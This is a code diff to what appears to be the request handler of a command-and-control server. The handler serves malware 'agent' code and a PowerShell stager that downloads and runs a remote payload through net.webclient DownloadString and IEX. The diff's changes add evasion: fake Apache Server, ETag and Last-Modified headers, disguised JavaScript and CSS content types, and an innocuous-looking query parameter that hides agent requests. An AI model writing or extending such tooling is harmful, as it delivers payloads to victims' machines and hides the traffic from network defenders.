@@ -29,9 +29,12 @@ class AgentHandler(BaseHandler):
         # Send response with additional headers to look like a real web server
         headers = {
             "Cache-Control": "max-age=3600, must-revalidate",
-            "Server": "Apache/2.4.41 (Ubuntu)"
+            "Server": "Apache/2.4.41 (Ubuntu)",
+            "Content-Type": "text/javascript", # More realistic for web resources
+            "ETag": "\"3f8-6017f1bc12b42\"", # Fake ETag for realism
+            "Last-Modified": "Tue, 28 Jan 2025 15:23:47 GMT" # Fake last-modified date
         }
-        self.send_response(200, "text/plain", agent_code, headers)
+        self.send_response(200, "text/javascript", agent_code, headers)
         self.log_message(f"Served agent code to {self.client_address[0]} (size: {len(agent_code)} bytes)")
         
     def handle_stager_request(self):
@@ -47,13 +50,14 @@ class AgentHandler(BaseHandler):
         # Get a random path from the pool for agent download
         random_path = self.path_router.get_random_path()
         
-        # Add agent type parameter to help with routing
+        # Add a mundane query parameter to help with routing 
+        # 'r=1' indicates agent request (resource parameter)
         if '?' in random_path:
-            random_path += '&type=agent'
+            random_path += '&r=1'
         else:
-            random_path += '?type=agent'
+            random_path += '?r=1'
         
-        # Create the stager code
+        # Create the stager code - this will download from a path tagged as agent resource
         protocol = "https" if use_ssl else "http"
         stager_code = f"$V=new-object net.webclient;$S=$V.DownloadString('{protocol}://{server_address}{random_path}');IEX($S)"
         
@@ -68,9 +72,12 @@ class AgentHandler(BaseHandler):
         # Log the stager request and path
         self.log_message(f"Serving stager code to {self.client_address[0]} using path: {random_path}")
         
-        # Send response with additional headers
+        # Send response with additional headers to make it look like CSS content
         headers = {
             "Cache-Control": "max-age=3600, must-revalidate",
-            "Server": "Apache/2.4.41 (Ubuntu)"
+            "Server": "Apache/2.4.41 (Ubuntu)",
+            "Content-Type": "text/css", # More realistic for stager
+            "ETag": "\"2c7-af609fb8b73c0\"", # Fake ETag for realism
+            "Last-Modified": "Mon, 17 Feb 2025 10:19:22 GMT" # Fake last-modified date
         }
-        self.send_response(200, "text/plain", stager_code, headers)
+        self.send_response(200, "text/css", stager_code, headers)
